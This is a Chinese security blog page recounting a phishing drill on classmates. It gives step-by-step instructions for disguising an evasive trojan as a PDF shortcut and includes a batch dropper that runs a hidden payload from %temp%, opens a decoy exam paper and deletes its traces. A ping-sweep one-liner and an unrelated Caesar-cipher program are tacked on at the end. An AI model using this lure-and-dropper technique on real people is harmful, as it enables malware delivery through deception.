@@ -1,0 +1,690 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/Avatar.jpg">
+  <link rel="icon" href="/img/Avatar.jpg">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="suuuu">
+  <meta name="keywords" content="blog">
+  
+    <meta name="description" content="记一次钓鱼演练&#x3D;&#x3D;注：本文只用于学习与交流，请不要在未授权的情况下做任何对计算机有危害的操作，一切后果作者不承担&#x3D;&#x3D; 钓鱼演练，首先要准备的肯定是一个免杀的木马 火绒跟windows defender都是没问题的，过不了360，但是无伤大雅，因为我事先看了一下， 没人用360&#x3D;&#x3D;因为只是测试，这个木马的shellcode只是弹个计算器，不">
+<meta property="og:type" content="article">
+<meta property="og:title" content="记一次钓鱼演练">
+<meta property="og:url" content="https://www.susec.xyz/2025/01/01/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%92%93%E9%B1%BC%E6%BC%94%E7%BB%83/index.html">
+<meta property="og:site_name" content="suuuu&#39;s blog">
+<meta property="og:description" content="记一次钓鱼演练&#x3D;&#x3D;注：本文只用于学习与交流，请不要在未授权的情况下做任何对计算机有危害的操作，一切后果作者不承担&#x3D;&#x3D; 钓鱼演练，首先要准备的肯定是一个免杀的木马 火绒跟windows defender都是没问题的，过不了360，但是无伤大雅，因为我事先看了一下， 没人用360&#x3D;&#x3D;因为只是测试，这个木马的shellcode只是弹个计算器，不">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101643811.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101808137.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103407047.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103458516.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103627662.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103712154.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103804220.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103829804.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103911849.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103941652.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104035467.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104101714.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104127939.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104944339.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225105244734.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225105611997.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225110355528.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111205892.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111234230.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111402252.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101222391.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102041537.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102221704.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102742675.png">
+<meta property="og:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102922843.png">
+<meta property="og:image" content="file:///C:/Users/m1371/AppData/Local/Temp/ksohtml34392/wps1.jpg">
+<meta property="og:image" content="file:///C:/Users/m1371/AppData/Local/Temp/ksohtml34392/wps2.jpg">
+<meta property="article:published_time" content="2024-12-31T16:00:00.000Z">
+<meta property="article:modified_time" content="2024-12-31T04:25:22.272Z">
+<meta property="article:author" content="suuuu">
+<meta property="article:tag" content="免杀">
+<meta property="article:tag" content="钓鱼">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101643811.png">
+  
+  
+  
+  <title>记一次钓鱼演练 - suuuu&#39;s blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"www.susec.xyz","root":"/","version":"1.9.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":false,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+
+  
+<meta name="generator" content="Hexo 7.2.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>suuuu</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>分类</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>标签</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/BlackRoses.png') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="记一次钓鱼演练"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-01-01 00:00" pubdate>
+          2025年1月1日 凌晨
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.6k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          14 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">记一次钓鱼演练</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="记一次钓鱼演练"><a href="#记一次钓鱼演练" class="headerlink" title="记一次钓鱼演练"></a>记一次钓鱼演练</h1><p>&#x3D;&#x3D;注：本文只用于学习与交流，请不要在未授权的情况下做任何对计算机有危害的操作，一切后果作者不承担&#x3D;&#x3D;</p>
+<p>钓鱼演练，首先要准备的肯定是一个免杀的木马<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101643811.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101808137.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>火绒跟windows defender都是没问题的，过不了360，但是无伤大雅，因为我事先看了一下， 没人用360&#x3D;&#x3D;因为只是测试，这个木马的shellcode只是弹个计算器，不会有别的危害&#x3D;&#x3D;<br>至于源码就不发了，相信各位大佬肯定都是随便免杀的，这里就不丢脸了</p>
+<p>钓鱼直接发个exe肯定没人信，接下来就是钓鱼的伪装，首先我们做Lnk伪造<br>第一步，新建文件夹<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103407047.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103458516.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>在文件夹里新建一个快捷方式<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103627662.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>先指向calc.exe<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103712154.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>右键属性选择更改图标<br>%SystemRoot%\System32\SHELL32.dll<br>填入这个<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103804220.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>更改成空白图标，再做一下重命名<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103829804.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>拖入010<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103911849.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>要选择第二个打开LN<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225103941652.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>这部分就是我们要改的内容，网上很多什么unicode修改，我不知道为什么一直出错，我后面选择了在010自带的内容里修改<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104035467.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>就是这里，改成.\1.pdf<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104101714.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>再保存<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104127939.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>再回去看，可以看到已经变成了一个带箭头的pdf快捷方式，然后就是找一些真的资料来骗<br>刚好正值考试季，找朋友要了下往年试卷<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225104944339.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>布局一下文件夹格式</p>
+<p>这是我想象的布局，第二个打码的是他们不用考的科目，他们应该不会打开，所以我计划在里面放🐎，<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225105244734.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>然后将三套离散卷子都改成触发🐎的快捷方式，这样既有一致性，无论点哪个都会触发，而且就放在根目录，应该会第一时间点开这个，至于概率论就放真的卷子好了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225105611997.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>然后在不用考的目录里多套几层壳，.png文件就是木马做了重命名，而且.png可以更好地规避杀毒软件的扫描，我们后续会通过bat来触发，再在这个文件夹里放入真的离散卷子<br>然后修改一下bat文件里的内容</p>
+<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">chcp 65001<br>cmd <span class="hljs-string">/c</span> xcopy <span class="hljs-string">/h</span> <span class="hljs-string">/y</span> %<span class="hljs-keyword">cd</span>%\ \_MACOX\<span class="hljs-string">.PDF</span>\<span class="hljs-string">.DS_Store.png</span> %temp%\<br>attrib -s -a -h %temp%\<span class="hljs-string">.DS_Store.png</span><br>start %temp%\<span class="hljs-string">.DS_Store.png</span><br><br>del <span class="hljs-string">&quot;《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf.lnk&quot;</span><br>copy %<span class="hljs-keyword">cd</span>%\ \_MACOX\<span class="hljs-string">.PDF</span>\《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf %<span class="hljs-keyword">cd</span>%\《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf<br>start %<span class="hljs-keyword">cd</span>%\《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf<br>del %<span class="hljs-keyword">cd</span>%\ \_MACOX\<span class="hljs-string">.PDF</span>\《离散数学》2018-2019学年第二学期期末试卷_4236024.pdf<br>del %<span class="hljs-keyword">cd</span>%\ \_MACOX\<span class="hljs-string">.PDF</span>\<span class="hljs-string">.DS_Store.png</span><br>del <span class="hljs-string">/s</span> <span class="hljs-string">/q</span> <span class="hljs-string">/f</span> %0<br></code></pre></td></tr></table></figure>
+<p>这里先用一套试卷大致写个demo，大体意思就是，先把png传到%temp%目录下，并且执行<br>然后把快捷方式删了，再把🐎目录下真正的试卷传到原本快捷方式的目录下，并打开，从而伪造一种真实的感觉，再把马目录下的东西都删了，只留一个.DS_Store，因为MAC笔记本存文件原本就有这个</p>
+<p>接下来就是修改快捷方式<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225110355528.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>如图修改，然后压缩打包<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111205892.png" srcset="/img/loading.gif" lazyload alt="image.png"><br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111234230.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>可以看到还是有挺多破绽的，先试试再说<br>本地测试一下<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225111402252.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>okok一切顺利<br>接下来就是<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225101222391.png" srcset="/img/loading.gif" lazyload alt="image.png"></p>
+<p>正当我等着他们发弹计算机截图的时候<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102041537.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>不是，这就被看出来了<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102221704.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>失算了，居然是云解压，而且云解压能很清楚的看到后缀.lnk<br>当然我的好同学还是愿意继续的，不过还是各种问题<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102742675.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>红温了，我仔细一看，不是，怎么有人不解压直接运行啊，我还故意加了密码，就是想着他们要填密码解压<br><img src="https://suuuuhexo2.oss-cn-guangzhou.aliyuncs.com/20241225102922843.png" srcset="/img/loading.gif" lazyload alt="image.png"><br>最后，也算是成功了</p>
+<p>总结：<br>zip的压缩方式容易失败，个人认为可以采用rar或者7z的加密文件名，这样子不解压就看不到里面的内容，可以避免一些问题，而且也要加上一些话术，让别人更容易相信，还有听说bat有一次直接报毒了，我本地没有这种情况，后续可能会再测试下vbs，还有就是试试能不能在隐藏文件夹的情况下再做调用，这样可能会更隐蔽</p>
+<p>感谢愿意配合我的同学，&#x3D;&#x3D;<strong>最后再声明一次，请在授权情况下再做测试，本文只用于交流学习</strong>&#x3D;&#x3D;</p>
+<p>demo<br>for i in $(seq 1 254);do ping -c 1 192.168.149.$i;done</p>
+<p><img src="file:///C:\Users\m1371\AppData\Local\Temp\ksohtml34392\wps1.jpg" srcset="/img/loading.gif" lazyload> </p>
+<p>如网关ip，.1.2，ping的通的就是目标主机</p>
+<p><img src="file:///C:\Users\m1371\AppData\Local\Temp\ksohtml34392\wps2.jpg" srcset="/img/loading.gif" lazyload> </p>
+<p>看到134成功Ping通，我们访问一下</p>
+<p>作业</p>
+<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;cctype&gt;</span> <span class="hljs-comment">// 用于 isalpha 和 toupper/tolower 函数</span></span><br><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-comment">// 函数声明</span><br><span class="hljs-function">string <span class="hljs-title">caesarCipher</span><span class="hljs-params">(string text, <span class="hljs-type">int</span> shift, <span class="hljs-type">bool</span> encrypt)</span></span>;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    string text;<br>    <span class="hljs-type">int</span> shift;<br>    <span class="hljs-type">char</span> choice;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入要处理的文本: &quot;</span>;<br>    <span class="hljs-built_in">getline</span>(cin, text); <span class="hljs-comment">// 使用 getline 读取带空格的文本</span><br><br>    cout &lt;&lt; <span class="hljs-string">&quot;请输入偏移量 (正数向右移，负数向左移): &quot;</span>;<br>    cin &gt;&gt; shift;<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;选择加密 (e) 或解密 (d): &quot;</span>;<br>    cin &gt;&gt; choice;<br><br>    string result;<br>    <span class="hljs-keyword">if</span> (choice == <span class="hljs-string">&#x27;e&#x27;</span> || choice == <span class="hljs-string">&#x27;E&#x27;</span>) &#123;<br>        result = <span class="hljs-built_in">caesarCipher</span>(text, shift, <span class="hljs-literal">true</span>);  <span class="hljs-comment">// 调用加密函数</span><br>        cout &lt;&lt; <span class="hljs-string">&quot;加密后的文本: &quot;</span> &lt;&lt; result &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (choice == <span class="hljs-string">&#x27;d&#x27;</span> || choice == <span class="hljs-string">&#x27;D&#x27;</span>) &#123;<br>        result = <span class="hljs-built_in">caesarCipher</span>(text, shift, <span class="hljs-literal">false</span>); <span class="hljs-comment">// 调用解密函数</span><br>        cout &lt;&lt; <span class="hljs-string">&quot;解密后的文本: &quot;</span> &lt;&lt; result &lt;&lt; endl;<br>    &#125;<br>    <span class="hljs-keyword">else</span> &#123;<br>        cout &lt;&lt; <span class="hljs-string">&quot;无效的选项！请选择 e 或 d。&quot;</span> &lt;&lt; endl;<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">1</span>; <span class="hljs-comment">// 返回错误码</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br><span class="hljs-function">string <span class="hljs-title">caesarCipher</span><span class="hljs-params">(string text, <span class="hljs-type">int</span> shift, <span class="hljs-type">bool</span> encrypt)</span> </span>&#123;<br>    string result = <span class="hljs-string">&quot;&quot;</span>; <span class="hljs-comment">// 初始化结果字符串</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">char</span> c : text) &#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-built_in">isalpha</span>(c)) &#123;  <span class="hljs-comment">// 检查是否是字母</span><br>            <span class="hljs-type">char</span> base = <span class="hljs-built_in">islower</span>(c) ? <span class="hljs-string">&#x27;a&#x27;</span> : <span class="hljs-string">&#x27;A&#x27;</span>; <span class="hljs-comment">// 根据大小写确定起始字符</span><br>            <span class="hljs-type">int</span> offset = (c - base);          <span class="hljs-comment">// 获取字母相对于 &#x27;a&#x27; 或 &#x27;A&#x27; 的偏移量</span><br><br>            <span class="hljs-keyword">if</span> (encrypt) &#123;<br>                offset = (offset + shift) % <span class="hljs-number">26</span>;  <span class="hljs-comment">// 加密时增加偏移量</span><br>            &#125;<br>            <span class="hljs-keyword">else</span> &#123;<br>                offset = (offset - shift + <span class="hljs-number">26</span>) % <span class="hljs-number">26</span>; <span class="hljs-comment">// 解密时减少偏移量，加上26以防止负数</span><br>            &#125;<br><br>            result += (<span class="hljs-type">char</span>)(base + offset);    <span class="hljs-comment">// 将偏移量转换回字符并添加到结果</span><br>        &#125;<br>        <span class="hljs-keyword">else</span> &#123;<br>            result += c; <span class="hljs-comment">// 如果不是字母，则保持原样</span><br>        &#125;<br>    &#125;<br>    <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure>
+                
+              </div>
+            
+            <hr/>
+            <div>
+              <div class="post-metas my-3">
+  
+    <div class="post-meta mr-3 d-flex align-items-center">
+      <i class="iconfont icon-category"></i>
+      
+
+<span class="category-chains">
+  
+  
+    
+      <span class="category-chain">
+        
+  <a href="/categories/%E9%92%93%E9%B1%BC/" class="category-chain-item">钓鱼</a>
+  
+  
+
+      </span>
+    
+  
+</span>
+
+    </div>
+  
+  
+    <div class="post-meta">
+      <i class="iconfont icon-tags"></i>
+      
+        <a href="/tags/%E5%85%8D%E6%9D%80/" class="print-no-link">#免杀</a>
+      
+        <a href="/tags/%E9%92%93%E9%B1%BC/" class="print-no-link">#钓鱼</a>
+      
+    </div>
+  
+</div>
+
+
+              
+  
+
+  <div class="license-box my-3">
+    <div class="license-title">
+      <div>记一次钓鱼演练</div>
+      <div>https://www.susec.xyz/2025/01/01/记一次钓鱼演练/</div>
+    </div>
+    <div class="license-meta">
+      
+        <div class="license-meta-item">
+          <div>作者</div>
+          <div>suuuu</div>
+        </div>
+      
+      
+        <div class="license-meta-item license-meta-date">
+          <div>发布于</div>
+          <div>2025年1月1日</div>
+        </div>
+      
+      
+      
+        <div class="license-meta-item">
+          <div>许可协议</div>
+          <div>
+            
+              
+              
+                <a class="print-no-link" target="_blank" href="https://creativecommons.org/licenses/by/4.0/">
+                  <span class="hint--top hint--rounded" aria-label="BY - 署名">
+                    <i class="iconfont icon-by"></i>
+                  </span>
+                </a>
+              
+            
+          </div>
+        </div>
+      
+    </div>
+    <div class="license-icon iconfont"></div>
+  </div>
+
+
+
+              
+                <div class="post-prevnext my-3">
+                  <article class="post-prev col-6">
+                    
+                    
+                      <a href="/2025/01/01/CVE-2021-44228/" title="CVE-2021-44228">
+                        <i class="iconfont icon-arrowleft"></i>
+                        <span class="hidden-mobile">CVE-2021-44228</span>
+                        <span class="visible-mobile">上一篇</span>
+                      </a>
+                    
+                  </article>
+                  <article class="post-next col-6">
+                    
+                    
+                      <a href="/2024/11/11/DC-1/" title="vulnhub靶场-DC-1">
+                        <span class="hidden-mobile">vulnhub靶场-DC-1</span>
+                        <span class="visible-mobile">下一篇</span>
+                        <i class="iconfont icon-arrowright"></i>
+                      </a>
+                    
+                  </article>
+                </div>
+              
+            </div>
+
+            
+          </article>
+        </div>
+      </div>
+    </div>
+
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+  <aside class="sidebar" style="margin-left: -1rem">
+    <div id="toc">
+  <p class="toc-header">
+    <i class="iconfont icon-list"></i>
+    <span>目录</span>
+  </p>
+  <div class="toc-body" id="toc-body"></div>
+</div>
+
+
+
+  </aside>
+
+
+    </div>
+  </div>
+</div>
+
+
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+  
+
+
+
+
+
+
+
+    
+
+    
+      <a id="scroll-top-button" aria-label="TOP" href="#" role="button">
+        <i class="iconfont icon-arrowup" aria-hidden="true"></i>
+      </a>
+    
+
+    
+      <div class="modal fade" id="modalSearch" tabindex="-1" role="dialog" aria-labelledby="ModalLabel"
+     aria-hidden="true">
+  <div class="modal-dialog modal-dialog-scrollable modal-lg" role="document">
+    <div class="modal-content">
+      <div class="modal-header text-center">
+        <h4 class="modal-title w-100 font-weight-bold">搜索</h4>
+        <button type="button" id="local-search-close" class="close" data-dismiss="modal" aria-label="Close">
+          <span aria-hidden="true">&times;</span>
+        </button>
+      </div>
+      <div class="modal-body mx-3">
+        <div class="md-form mb-5">
+          <input type="text" id="local-search-input" class="form-control validate">
+          <label data-error="x" data-success="v" for="local-search-input">关键词</label>
+        </div>
+        <div class="list-group" id="local-search-result"></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+    
+
+    
+  </main>
+
+  <footer>
